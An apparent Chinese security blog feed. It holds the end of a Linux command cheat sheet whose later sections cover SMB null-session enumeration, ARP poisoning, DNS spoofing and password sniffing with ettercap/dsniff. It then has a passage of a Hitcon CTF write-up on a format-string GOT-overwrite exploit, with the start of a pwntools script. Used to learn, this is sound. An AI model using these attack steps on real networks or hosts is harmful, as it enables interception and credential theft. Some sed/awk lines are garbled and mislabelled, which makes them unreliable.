function">tar</span> -xvfz archive.tar.gz 解压一个gzip格式的压缩包 <span class="token function">zip</span> file1.zip file1 创建一个zip格式的压缩包 <span class="token function">zip</span> -r file1.zip file1 file2 dir1 将几个文件和目录同时压缩成一个zip格式的压缩包 unzip file1.zip 解压一个zip格式压缩包RPM 包 - （Fedora, Redhat及类似系统） rpm -ivh package.rpm 安装一个rpm包 rpm -ivh --nodeeps package.rpm 安装一个rpm包而忽略依赖关系警告 rpm -U package.rpm 更新一个rpm包但不改变其配置文件 rpm -F package.rpm 更新一个确定已经安装的rpm包 rpm -e package_name.rpm 删除一个rpm包 rpm -qa 显示系统中所有已经安装的rpm包 rpm -qa <span class="token operator">|</span> <span class="token function">grep</span> httpd 显示所有名称中包含 <span class="token string">"httpd"</span> 字样的rpm包 rpm -qi package_name 获取一个已安装包的特殊信息 rpm -qg <span class="token string">"System Environment/Daemons"</span> 显示一个组件的rpm包 rpm -ql package_name 显示一个已经安装的rpm包提供的文件列表 rpm -qc package_name 显示一个已经安装的rpm包提供的配置文件列表 rpm -q package_name --whatrequires 显示与一个rpm包存在依赖关系的列表 rpm -q package_name --whatprovides 显示一个rpm包所占的体积 rpm -q package_name --**s 显示在安装/删除期间所执行的脚本l rpm -q package_name --changelog 显示一个rpm包的修改历史 rpm -qf /etc/httpd/conf/httpd.conf 确认所给的文件由哪个rpm包所提供 rpm -qp package.rpm -l 显示由一个尚未安装的rpm包提供的文件列表 rpm --import /media/cdrom/RPM-GPG-KEY 导入公钥数字证书 rpm --checksig package.rpm 确认一个rpm包的完整性 rpm -qa gpg-pubkey 确认已安装的所有rpm包的完整性 rpm -V package_name 检查文件尺寸、 许可、类型、所有者、群组、MD5检查以及最后修改时间 rpm -Va 检查系统中所有已安装的rpm包- 小心使用 rpm -Vp package.rpm 确认一个rpm包还未安装 rpm2cpio package.rpm <span class="token operator">|</span> cpio --extract --make-directories *bin* 从一个rpm包运行可执行文件 rpm -ivh /usr/src/redhat/RPMS/<span class="token variable"><span class="token variable">`</span>arch<span class="token variable">`</span></span>/package.rpm 从一个rpm源码安装一个构建好的包 rpmbuild --rebuild package_name.src.rpm 从一个rpm源码构建一个 rpm 包YUM 软件包升级器 - （Fedora, RedHat及类似系统） yum <span class="token function">install</span> package_name 下载并安装一个rpm包 yum localinstall package_name.rpm 将安装一个rpm包，使用你自己的软件仓库为你解决所有依赖关系 yum update package_name.rpm 更新当前系统中所有安装的rpm包 yum update package_name 更新一个rpm包 yum remove package_name 删除一个rpm包 yum list 列出当前系统中安装的所有包 yum search package_name 在rpm仓库中搜寻软件包 yum clean packages 清理rpm缓存删除下载的包 yum clean headers 删除所有头文件 yum clean all 删除所有缓存的包和头文件DEB 包 <span class="token punctuation">(</span>Debian, Ubuntu 以及类似系统<span class="token punctuation">)</span> dpkg -i package.deb 安装/更新一个 deb 包 dpkg -r package_name 从系统删除一个 deb 包 dpkg -l 显示系统中所有已经安装的 deb 包 dpkg -l <span class="token operator">|</span> <span class="token function">grep</span> httpd 显示所有名称中包含 <span class="token string">"httpd"</span> 字样的deb包 dpkg -s package_name 获得已经安装在系统中一个特殊包的信息 dpkg -L package_name 显示系统中已经安装的一个deb包所提供的文件列表 dpkg --contents package.deb 显示尚未安装的一个包所提供的文件列表 dpkg -S /bin/ping 确认所给的文件由哪个deb包提供APT 软件工具 <span class="token punctuation">(</span>Debian, Ubuntu 以及类似系统<span class="token punctuation">)</span> <span class="token function">apt-get</span> <span class="token function">install</span> package_name 安装/更新一个 deb 包 apt-cdrom <span class="token function">install</span> package_name 从光盘安装/更新一个 deb 包 <span class="token function">apt-get</span> update 升级列表中的软件包 <span class="token function">apt-get</span> upgrade 升级所有已安装的软件 <span class="token function">apt-get</span> remove package_name 从系统删除一个deb包 <span class="token function">apt-get</span> check 确认依赖的软件仓库正确 <span class="token function">apt-get</span> clean 从下载的软件包中清理缓存 apt-cache search searched-package 返回包含所要搜索字符串的软件包名称返回顶部索引 ^查看文件内容 <span class="token function">cat</span> file1 从第一个字节开始正向查看文件的内容 tac file1 从最后一行开始反向查看一个文件的内容 <span class="token function">more</span> file1 查看一个长文件的内容 <span class="token function">less</span> file1 类似于 <span class="token string">'more'</span> 命令，但是它允许在文件中和正向操作一样的反向操作 <span class="token function">head</span> -2 file1 查看一个文件的前两行 <span class="token function">tail</span> -2 file1 查看一个文件的最后两行 <span class="token function">tail</span> -f /var/log/messages 实时查看被添加到一个文件中的内容</code></pre><h2 id="文本处理"><a href="#文本处理" class="headerlink" title="文本处理"></a>文本处理</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">cat</span> file1 file2 <span class="token punctuation">..</span>. <span class="token operator">|</span> <span class="token function">command</span> <span class="token operator">&lt;</span><span class="token operator">></span> file1_in.txt_or_file1_out.txt general syntax <span class="token keyword">for</span> text manipulation using PIPE, STDIN and STDOUT <span class="token function">cat</span> file1 <span class="token operator">|</span> command<span class="token punctuation">(</span> sed, grep, awk, grep, etc<span class="token punctuation">..</span>.<span class="token punctuation">)</span> <span class="token operator">></span> result.txt 合并一个文件的详细说明文本，并将简介写入一个新文件中 <span class="token function">cat</span> file1 <span class="token operator">|</span> command<span class="token punctuation">(</span> sed, grep, awk, grep, etc<span class="token punctuation">..</span>.<span class="token punctuation">)</span> <span class="token operator">>></span> result.txt 合并一个文件的详细说明文本，并将简介写入一个已有的文件中 <span class="token function">grep</span> Aug /var/log/messages 在文件 <span class="token string">'/var/log/messages'</span>中查找关键词<span class="token string">"Aug"</span> <span class="token function">grep</span> ^Aug /var/log/messages 在文件 <span class="token string">'/var/log/messages'</span>中查找以<span class="token string">"Aug"</span>开始的词汇 <span class="token function">grep</span> <span class="token punctuation">[</span>0-9<span class="token punctuation">]</span> /var/log/messages 选择 <span class="token string">'/var/log/messages'</span> 文件中所有包含数字的行 <span class="token function">grep</span> Aug -R /var/log/* 在目录 <span class="token string">'/var/log'</span> 及随后的目录中搜索字符串<span class="token string">"Aug"</span> <span class="token function">sed</span> <span class="token string">'s/stringa1/stringa2/g'</span> example.txt 将example.txt文件中的 <span class="token string">"string1"</span> 替换成 <span class="token string">"string2"</span> <span class="token function">sed</span> <span class="token string">'/^/d'</span> example.txt 从example.txt文件中删除所有空白行  <span class="token function">sed</span> <span class="token string">'/ *#/d; /^/d'</span> example.txt 从example.txt文件中删除所有空白行  <span class="token function">sed</span> <span class="token string">'/ *#/d; /^/d'</span> example.txt 从example.txt文件中删除所有注释和空白行 <span class="token keyword">echo</span> <span class="token string">'esempio'</span> <span class="token operator">|</span> <span class="token function">tr</span> <span class="token string">'[:lower:]'</span> <span class="token string">'[:upper:]'</span> 合并上下单元格内容 <span class="token function">sed</span> -e <span class="token string">'1d'</span> result.txt 从文件example.txt 中排除第一行 <span class="token function">sed</span> -n <span class="token string">'/stringa1/p'</span> 查看只包含词汇 <span class="token string">"string1"</span>的行 <span class="token function">sed</span> -e <span class="token string">'s/ *//′example.txt删除每一行最后的空白字符sed−e′s/stringa1//g′example.txt从文档中只删除词汇"string1"并保留剩余全部sed−n′1,5p;5q′example.txt查看从第一行到第5行内容sed−n′5p;5q′example.txt查看第5行sed−e′s/00∗/0/g′example.txt用单个零替换多个零cat−nfile1标示文件的行数catexample.txt|awk′NR//′example.txt删除每一行最后的空白字符sed−e′s/stringa1//g′example.txt从文档中只删除词汇"string1"并保留剩余全部sed−n′1,5p;5q′example.txt查看从第一行到第5行内容sed−n′5p;5q′example.txt查看第5行sed−e′s/00∗/0/g′example.txt用单个零替换多个零cat−nfile1标示文件的行数catexample.txt|awk′NR1}'</span> 查看一行第一栏 <span class="token keyword">echo</span> a b c <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print 1,1,3}'</span> 查看一行的第一和第三栏 <span class="token function">paste</span> file1 file2 合并两个文件或两栏的内容 <span class="token function">paste</span> -d <span class="token string">'+'</span> file1 file2 合并两个文件或两栏的内容，中间用<span class="token string">"+"</span>区分 <span class="token function">sort</span> file1 file2 排序两个文件的内容 <span class="token function">sort</span> file1 file2 <span class="token operator">|</span> <span class="token function">uniq</span> 取出两个文件的并集<span class="token punctuation">(</span>重复的行只保留一份<span class="token punctuation">)</span> <span class="token function">sort</span> file1 file2 <span class="token operator">|</span> <span class="token function">uniq</span> -u 删除交集，留下其他的行 <span class="token function">sort</span> file1 file2 <span class="token operator">|</span> <span class="token function">uniq</span> -d 取出两个文件的交集<span class="token punctuation">(</span>只留下同时存在于两个文件中的文件<span class="token punctuation">)</span> <span class="token function">comm</span> -1 file1 file2 比较两个文件的内容只删除 <span class="token string">'file1'</span> 所包含的内容 <span class="token function">comm</span> -2 file1 file2 比较两个文件的内容只删除 <span class="token string">'file2'</span> 所包含的内容 <span class="token function">comm</span> -3 file1 file2 比较两个文件的内容只删除两个文件共有的部分</code></pre><h2 id="字符设置和文件格式转换"><a href="#字符设置和文件格式转换" class="headerlink" title="字符设置和文件格式转换"></a>字符设置和文件格式转换</h2><pre class=" language-bash"><code class="language-bash">dos2unix filedos.txt fileunix.txt 将一个文本文件的格式从MSDOS转换成UNIX unix2dos fileunix.txt filedos.txt 将一个文本文件的格式从UNIX转换成MSDOS recode <span class="token punctuation">..</span>HTML <span class="token operator">&lt;</span> page.txt <span class="token operator">></span> page.html 将一个文本文件转换成html recode -l <span class="token operator">|</span> <span class="token function">more</span> 显示所有允许的转换格式</code></pre><h2 id="文件系统分析"><a href="#文件系统分析" class="headerlink" title="文件系统分析"></a>文件系统分析</h2><pre class=" language-bash"><code class="language-bash">badblocks -v /dev/hda1 检查磁盘hda1上的坏磁块 <span class="token function">fsck</span> /dev/hda1 修复/检查hda1磁盘上linux文件系统的完整性 fsck.ext2 /dev/hda1 修复/检查hda1磁盘上ext2文件系统的完整性 e2fsck /dev/hda1 修复/检查hda1磁盘上ext2文件系统的完整性 e2fsck -j /dev/hda1 修复/检查hda1磁盘上ext3文件系统的完整性 fsck.ext3 /dev/hda1 修复/检查hda1磁盘上ext3文件系统的完整性 fsck.vfat /dev/hda1 修复/检查hda1磁盘上fat文件系统的完整性 fsck.msdos /dev/hda1 修复/检查hda1磁盘上dos文件系统的完整性 dosfsck /dev/hda1 修复/检查hda1磁盘上dos文件系统的完整性</code></pre><h2 id="初始化一个文件系统"><a href="#初始化一个文件系统" class="headerlink" title="初始化一个文件系统"></a>初始化一个文件系统</h2><pre class=" language-bash"><code class="language-bash"> mkfs /dev/hda1 在hda1分区创建一个文件系统 mke2fs /dev/hda1 在hda1分区创建一个linux ext2的文件系统 mke2fs -j /dev/hda1 在hda1分区创建一个linux ext3<span class="token punctuation">(</span>日志型<span class="token punctuation">)</span>的文件系统 mkfs -t vfat 32 -F /dev/hda1 创建一个 FAT32 文件系统 <span class="token function">fdformat</span> -n /dev/fd0 格式化一个软盘 mkswap /dev/hda3 创建一个swap文件系统SWAP文件系统 mkswap /dev/hda3 创建一个swap文件系统 swapon /dev/hda3 启用一个新的swap文件系统 swapon /dev/hda2 /dev/hdb3 启用两个swap分区</code></pre><h2 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h2><pre class=" language-bash"><code class="language-bash">dump -0aj -f /tmp/home0.bak /home 制作一个 <span class="token string">'/home'</span> 目录的完整备份 dump -1aj -f /tmp/home0.bak /home 制作一个 <span class="token string">'/home'</span> 目录的交互式备份 restore -if /tmp/home0.bak 还原一个交互式备份 <span class="token function">rsync</span> -rogpav --delete /home /tmp 同步两边的目录 <span class="token function">rsync</span> -rogpav -e <span class="token function">ssh</span> --delete /home ip_address:/tmp 通过SSH通道rsync <span class="token function">rsync</span> -az -e <span class="token function">ssh</span> --delete ip_addr:/home/public /home/local 通过ssh和压缩将一个远程目录同步到本地目录 <span class="token function">rsync</span> -az -e <span class="token function">ssh</span> --delete /home/local ip_addr:/home/public 通过ssh和压缩将本地目录同步到远程目录 <span class="token function">dd</span> bs<span class="token operator">=</span>1M if<span class="token operator">=</span>/dev/hda <span class="token operator">|</span> <span class="token function">gzip</span> <span class="token operator">|</span> <span class="token function">ssh</span> user@ip_addr <span class="token string">'dd of=hda.gz'</span> 通过ssh在远程主机上执行一次备份本地磁盘的操作 <span class="token function">dd</span> if<span class="token operator">=</span>/dev/sda of<span class="token operator">=</span>/tmp/file1 备份磁盘内容到一个文件 <span class="token function">tar</span> -Puf backup.tar /home/user 执行一次对 <span class="token string">'/home/user'</span> 目录的交互式备份操作 <span class="token punctuation">(</span> <span class="token function">cd</span> /tmp/local/ <span class="token operator">&amp;&amp;</span> <span class="token function">tar</span> c <span class="token keyword">.</span> <span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token function">ssh</span> -C user@ip_addr <span class="token string">'cd /home/share/ &amp;&amp; tar x -p'</span> 通过ssh在远程目录中复制一个目录内容 <span class="token punctuation">(</span> <span class="token function">tar</span> c /home <span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token function">ssh</span> -C user@ip_addr <span class="token string">'cd /home/backup-home &amp;&amp; tar x -p'</span> 通过ssh在远程目录中复制一个本地目录 <span class="token function">tar</span> cf - <span class="token keyword">.</span> <span class="token operator">|</span> <span class="token punctuation">(</span>cd /tmp/backup <span class="token punctuation">;</span> <span class="token function">tar</span> xf - <span class="token punctuation">)</span> 本地将一个目录复制到另一个地方，保留原有权限及链接 <span class="token function">find</span> /home/user1 -name <span class="token string">'*.txt'</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">cp</span> -av --target-directory<span class="token operator">=</span>/home/backup/ --parents 从一个目录查找并复制所有以 <span class="token string">'.txt'</span> 结尾的文件到另一个目录 <span class="token function">find</span> /var/log -name <span class="token string">'*.log'</span> <span class="token operator">|</span> <span class="token function">tar</span> cv --files-from<span class="token operator">=</span>- <span class="token operator">|</span> <span class="token function">bzip2</span> <span class="token operator">></span> log.tar.bz2 查找所有以 <span class="token string">'.log'</span> 结尾的文件并做成一个bzip包 <span class="token function">dd</span> if<span class="token operator">=</span>/dev/hda of<span class="token operator">=</span>/dev/fd0 bs<span class="token operator">=</span>512 count<span class="token operator">=</span>1 做一个将 MBR <span class="token punctuation">(</span>Master Boot Record<span class="token punctuation">)</span>内容复制到软盘的动作 <span class="token function">dd</span> if<span class="token operator">=</span>/dev/fd0 of<span class="token operator">=</span>/dev/hda bs<span class="token operator">=</span>512 count<span class="token operator">=</span>1 从已经保存到软盘的备份中恢复MBR内容</code></pre><h2 id="光盘"><a href="#光盘" class="headerlink" title="光盘"></a>光盘</h2><pre class=" language-bash"><code class="language-bash">cdrecord -v gracetime<span class="token operator">=</span>2 dev<span class="token operator">=</span>/dev/cdrom -eject blank<span class="token operator">=</span>fast -force 清空一个可复写的光盘内容 <span class="token function">mkisofs</span> /dev/cdrom <span class="token operator">></span> cd.iso 在磁盘上创建一个光盘的iso镜像文件 <span class="token function">mkisofs</span> /dev/cdrom <span class="token operator">|</span> <span class="token function">gzip</span> <span class="token operator">></span> cd_iso.gz 在磁盘上创建一个压缩了的光盘iso镜像文件 <span class="token function">mkisofs</span> -J -allow-leading-dots -R -V <span class="token string">"Label CD"</span> -iso-level 4 -o ./cd.iso data_cd 创建一个目录的iso镜像文件 cdrecord -v dev<span class="token operator">=</span>/dev/cdrom cd.iso 刻录一个ISO镜像文件 <span class="token function">gzip</span> -dc cd_iso.gz <span class="token operator">|</span> cdrecord dev<span class="token operator">=</span>/dev/cdrom - 刻录一个压缩了的ISO镜像文件 <span class="token function">mount</span> -o loop cd.iso /mnt/iso 挂载一个ISO镜像文件 cd-paranoia -B 从一个CD光盘转录音轨到 wav 文件中 cd-paranoia -- <span class="token string">"-3"</span> 从一个CD光盘转录音轨到 wav 文件中（参数-3） cdrecord --scanbus 扫描总线以识别scsi通道 <span class="token function">dd</span> if<span class="token operator">=</span>/dev/hdc <span class="token operator">|</span> md5sum 校验一个设备的md5sum编码，例如一张 CD</code></pre><h2 id="应用命令"><a href="#应用命令" class="headerlink" title="应用命令"></a>应用命令</h2><pre class=" language-bash"><code class="language-bash">whois 域名/ip 查看域名的详细信息。<span class="token function">ping</span> 域名/ip 测试本机到远端主机是否联通。<span class="token function">dig</span> 域名/ip 查看域名解析的详细信息。host -l 域名 dns服务器 传输zone。</code></pre><h2 id="扫描nmap"><a href="#扫描nmap" class="headerlink" title="扫描nmap"></a>扫描nmap</h2><pre class=" language-bash"><code class="language-bash">-sS 半开扫描TCP和SYN扫描。-sT 完全TCP连接扫描。-sU UDP扫描-PS syn包探测<span class="token punctuation">(</span>防火墙探测<span class="token punctuation">)</span>-PA ack包探测<span class="token punctuation">(</span>防火墙探测<span class="token punctuation">)</span>-PN 不ping。-n 不dns解析。-A -O和-sV。-O 操作系统识别。-sV 服务版本信息<span class="token punctuation">(</span>banner<span class="token punctuation">)</span>-p 端口扫描。-T 设置时间级别<span class="token punctuation">(</span>0-5<span class="token punctuation">)</span>-iL 导入扫描结果。-oG 输出扫描结果。操作系统识别:p0f -i eth0 -U -p 开启混杂模式。xprobe2 ip<span class="token operator">|</span>域名 检测os。banner获取:nc ip port 检测端口是否打开。telnet ip port 检测端口是否打开。<span class="token function">wget</span> ip 下载主页。<span class="token function">cat</span> index.html <span class="token operator">|</span> <span class="token function">more</span> 显示主页代码。q 退出。windows枚举nmap -sS -p 139,445 ip 扫描windows。<span class="token function">cd</span> /pentest/enumeration/smb-enumnbtscan -f targetIP 检测netbios。smbgetserverinfo -i targetIP 扫描name,os,组。smbdumpusers -i targetIP 列出用户。smbclient -L //targetIP 列出共享。使用windows:net use \\ipipc$ <span class="token string">""</span> /u:<span class="token string">""</span> 开启空会话。net view \\ip 显示共享信息。smbclient:smbclient -L hostName -I targetIP 枚举共享。smbclient -L hostName/share -U <span class="token string">""</span> 用空用户连接。smbclient -L hostName -I targetIP -U admin普通用户连接。rpcclient:rpcclient targetIP -U “”打开一个空会话。netshareenum 枚举共享。enumdomusers 枚举用户。lsaenumsid 枚举域SID。queryuser RID 查询用户信息。createdomuser 创建用户访问。</code></pre><h2 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h2><pre class=" language-bash"><code class="language-bash">ettercap:<span class="token function">nano</span> /usr/local/etc/etter.conf配置文件Sniff <span class="token operator">></span> Unified sniffing <span class="token operator">></span> Network interface: eth0 <span class="token operator">></span> OK 设置抓包的网卡Hosts <span class="token operator">></span> Scan <span class="token keyword">for</span> hosts <span class="token punctuation">(</span>do this two times<span class="token punctuation">)</span>扫描网段的主机Hosts <span class="token operator">></span> Hosts list 显示主机列表Select the default gateway <span class="token operator">></span> Add to Target 1 添加主机Select the target <span class="token operator">></span> Add to Target 2 添加主机Mitm <span class="token operator">></span> Arp poisoning <span class="token operator">></span> Sniff remote connections <span class="token operator">></span> OK 设置ARP攻击Start <span class="token operator">></span> Start sniffing 开始攻击dsniff -i eth0 监听网卡窃听登录用户密码urlsnarf -i eth0 嗅探http请求msgsnarf -i eth0 嗅探聊天软件的聊天内容driftnet -i eth0 网络管理嗅探图片，音频。dns欺骗:<span class="token function">nano</span> /usr/local/share/ettercap/etter.dns编辑配置文件Plugins <span class="token operator">></span> Manage the plugins <span class="token operator">></span> dns_spoof 设置dns欺骗Mitm <span class="token operator">></span> Arp poisoning <span class="token operator">></span> Sniff remote connections <span class="token operator">></span> OK 设置ARPStart <span class="token operator">></span> Start sniffing 开始攻击</code></pre><h2 id="Exploits漏洞利用"><a href="#Exploits漏洞利用" class="headerlink" title="Exploits漏洞利用"></a>Exploits漏洞利用</h2><pre class=" language-bash"><code class="language-bash"><span class="token function">cd</span> /pentest/exploits/exploit-db 进入目录<span class="token function">cat</span> sploitlist.txt <span class="token operator">|</span> <span class="token function">grep</span> -i <span class="token punctuation">[</span>exploit<span class="token punctuation">]</span> 查询需要的漏洞<span class="token function">cat</span> exploit <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"#include"</span>检查运行环境<span class="token function">cat</span> sploitlist.txt <span class="token operator">|</span> <span class="token function">grep</span> -i exploit <span class="token operator">|</span> <span class="token function">cut</span> -d <span class="token string">" "</span> -f1 <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">grep</span> sys <span class="token operator">|</span> <span class="token function">cut</span> -d <span class="token string">":"</span> -f1 <span class="token operator">|</span> <span class="token function">sort</span> -u只保留可以在linux下运行的代码Metasploit:svn update 升级./msfweb Web接口127.0.0.1:55555。../msfconsole 字符下的Console。<span class="token function">help</span> 帮助show 显示选项 searc</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;dev-null&quot;&gt;&lt;a href=&quot;#dev-null&quot; class=&quot;headerlink&quot; title=&quot;/dev/null&quot;&gt;&lt;/a&gt;/dev/null&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;😭因为忘了参考了哪些文章，所以如若
      
    
    </summary>
    
      <category term="Linux" scheme="http://www.yof3ng.xyz/categories/Linux/"/>
    
    
      <category term="Linux重定向" scheme="http://www.yof3ng.xyz/tags/Linux%E9%87%8D%E5%AE%9A%E5%90%91/"/>
    
      <category term="常用命令集" scheme="http://www.yof3ng.xyz/tags/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>Pwn-10月31-Hitcon-五</title>
    <link href="http://www.yof3ng.xyz/2018/10/31/Pwn-10%E6%9C%8831-Hitcon-%E4%BA%94/"/>
    <id>http://www.yof3ng.xyz/2018/10/31/Pwn-10月31-Hitcon-五/</id>
    <published>2018-10-31T12:44:52.000Z</published>
    <updated>2018-11-02T14:23:17.654Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Pwn-十月31-Hitcon-五"><a href="#Pwn-十月31-Hitcon-五" class="headerlink" title="Pwn-十月31-Hitcon-五"></a>Pwn-十月31-Hitcon-五</h1><blockquote><p>鸽了几天之后，继续练习Hitcon😭🆒。</p></blockquote><h2 id="lab9-playfmt"><a href="#lab9-playfmt" class="headerlink" title="lab9-playfmt"></a>lab9-playfmt</h2><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; 同样，这一题也是格式化字符串漏洞，但是这题的格式化字符串不在栈上，而是在全局变量（.bss)段？？？什么情况🙃。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 所以这题我们不能直接通过控制栈上变量来修改Got表，那意思是什么呢？就可以通过间接的方式来修改Got表内容咯。</p></blockquote><h3 id="查看文件信息并且检查保护措施"><a href="#查看文件信息并且检查保护措施" class="headerlink" title="查看文件信息并且检查保护措施"></a>查看文件信息并且检查保护措施</h3><blockquote><p><code>checksec playfmt</code>:</p><p><img src="https://i.loli.net/2018/10/31/5bd9a7693eb66.png" alt=""></p></blockquote><h3 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h3><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; 简单运行一下程序可以看到，这次的printf函数buf不在栈上，而是在bss段。</p></blockquote><p><img src="https://i.loli.net/2018/10/31/5bd9a9c834154.png" alt=""></p><p>IDA看一看：</p><p><img src="https://i.loli.net/2018/10/31/5bd9ab6a202f0.png" alt=""></p><p>的确是格式化字符串的漏洞，很明显咯。</p><p><img src="https://i.loli.net/2018/10/31/5bd9accfc0a7b.png" alt=""></p><p>用gdb调试，并且输入4个a，可以看到buf不在栈上。</p><blockquote><p> 引用大佬的话：<code>通过修改栈中存在的指针，将其指向栈上的变量，可以间接地实现写got，这种方式是一种常见的套路。</code></p><p> c/c++中的<code>%n</code>是什么意思呢，它是输入格式化控制字符，在这题中可以用于修改栈中变量的值。</p></blockquote><p>我们可以在printf函数处下断点，查看栈中变量情况：</p><p><img src="https://i.loli.net/2018/10/31/5bd9b9c7dc455.png" alt=""></p><p>&nbsp; &nbsp; &nbsp; &nbsp; 可以看到偏移量为6的地方是ebp，而ebp指向了另外一个地址，即偏移量为10的地方，然后又指向偏移量为15的位置。这里我们其实可以走一步捷径，通过获得偏移量为8的地方这个函数地址，leak出libc基地址。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 正是因为程序是循环运行，所以给了我们足够多次数来间接覆写GOT表。</p><blockquote><p> 解题逻辑（<a href="https://www.jianshu.com/p/2cae38284bff" target="_blank" rel="noopener">来自23r3f</a> ）：</p><pre class=" language-python"><code class="language-python"> ebp_1 <span class="token operator">&lt;=</span><span class="token operator">=</span><span class="token operator">></span>printf函数栈中偏移量为<span class="token number">6</span><span class="token punctuation">,</span> 即$ebp ebp_2 <span class="token operator">&lt;=</span><span class="token operator">=</span><span class="token operator">></span>printf函数栈中偏移量为<span class="token number">10</span><span class="token punctuation">,</span> 即$ebp的值地址 fmt_7 <span class="token operator">&lt;=</span><span class="token operator">=</span><span class="token operator">></span>printf函数栈中偏移量为<span class="token number">7</span> fmt_11 <span class="token operator">&lt;=</span><span class="token operator">=</span><span class="token operator">></span>printf函数栈中偏移量为<span class="token number">11</span></code></pre><p> &nbsp; &nbsp; &nbsp; &nbsp; ebp1的内容是指向ebp2的地址的指针，而ebp2的内容又是指向其他地址的指针，因此如果我们用%n对ebp1进行操作，那么实际上会修改ebp2的值，如果此时再把ebp2的内容改成一个指向fmt7的指针，然后在对ebp2进行%n操作，那么就可以改变fmt7的内容，从而实现了间接修改某个地址的内容，试想一下，我们把fmt7的内容又改成printf的got表地址，那么fmt7就指向了printf_got的地址，如果用%s操作，就可以把printf_got的内容打印出来，从而得到了printf函数的真正地址，到了这里，我们就可以通过printf函数泄漏出system的真正地址了。</p><p> 具体思路：</p><pre class=" language-python"><code class="language-python"> <span class="token number">1</span><span class="token punctuation">.</span>通过ebp_1使ebp_2指向fmt_7 <span class="token number">2</span><span class="token punctuation">.</span>通过ebp_2将fmt_7处的内容覆盖成printf_got <span class="token number">3</span><span class="token punctuation">.</span>通过ebp_1使ebp_2指向fmt_11 <span class="token number">4</span><span class="token punctuation">.</span>通过ebp_2将fmt_11处的内容修改成printf_got<span class="token operator">+</span><span class="token number">2</span> <span class="token number">5</span><span class="token punctuation">.</span>通过fmt_7将printf_got地址泄露出来 <span class="token number">6</span><span class="token punctuation">.</span>计算出system函数的地址 <span class="token punctuation">,</span>将system函数地址写入printf在got表的地址 具体做法是将 system函数地址的前两个字节写入fmt_7<span class="token punctuation">,</span>后两个字节写入 fmt_11 <span class="token number">7</span><span class="token punctuation">.</span>执行printf函数相当于执行system函数 <span class="token number">8</span><span class="token punctuation">.</span>输入<span class="token string">"/bin/sh"</span>字符串，让system函数从栈中取参数getshell</code></pre></blockquote><p>接下来直接通过理解各位大佬exp的方式，来深入理解这一道题（太菜了我）。</p><h3 id="构造EXP"><a href="#构造EXP" class="headerlink" title="构造EXP"></a>构造EXP</h3><p>三份大佬EXP各有不同技巧：分别来自M4x，23r3f，veritas501</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>__Auther__ <span class="token operator">=</span> <span class="token string">'M4x'</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'i386'</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'deepin-terminal'</span><span class="token punctuation">,</span> <span class="token string">'-x'</span><span class="token punctuation">,</span> <span class="token string">'sh'</span><span class="token punctuation">,</span> <span class="token string">'-c'</span><span class="token punctuation">]</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./playfmt"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/i386-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./playfmt"</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''Breakpoint *do_fmt+64pwndbg> x/3s 0x804a0600x804a060 &lt;buf>:    "..%8$p....%6$p."...0x804a06f &lt;buf+15>:    ".11111111"0x804a079 &lt;buf+25>:    ""pwndbg> stack 2500:0000│ esp  0xffa077c0 —▸ 0x804a060 (buf) ◂— 0x38252e2e ('..%8')01:0004│      0xffa077c4 —▸ 0x8048640 ◂— jno    0x80486b7 /* 'quit' */02:0008│      0xffa077c8 ◂— 0x403:000c│      0xffa077cc —▸ 0x804857c (play+51) ◂— add    esp, 0x1004:0010│      0xffa077d0 —▸ 0x8048645 ◂— cmp    eax, 0x3d3d3d3d05:0014│      0xffa077d4 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db006:0018│ ebp  0xffa077d8 —▸ 0xffa077e8 —▸ 0xffa077f8 ◂— 0x007:001c│      0xffa077dc —▸ 0x8048584 (play+59) ◂— nop08:0020│      0xffa077e0 —▸ 0xf7eb0d60 (_IO_2_1_stdout_) ◂— 0xfbad288709:0024│      0xffa077e4 ◂— 0x00a:0028│      0xffa077e8 —▸ 0xffa077f8 ◂— 0x00b:002c│      0xffa077ec —▸ 0x80485b1 (main+42) ◂— nop0c:0030│      0xffa077f0 —▸ 0xf7eb03dc (__exit_funcs) —▸ 0xf7eb11e0 (initial) ◂— 0x00d:0034│      0xffa077f4 —▸ 0xffa07810 ◂— 0x10e:0038│      0xffa077f8 ◂— 0x00f:003c│      0xffa077fc —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x1010:0040│      0xffa07800 ◂— 0x111:0044│      0xffa07804 —▸ 0xf7eb0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b2db012:0048│      0xffa07808 ◂— 0x013:004c│      0xffa0780c —▸ 0xf7d15276 (__libc_start_main+246) ◂— add    esp, 0x1014:0050│      0xffa07810 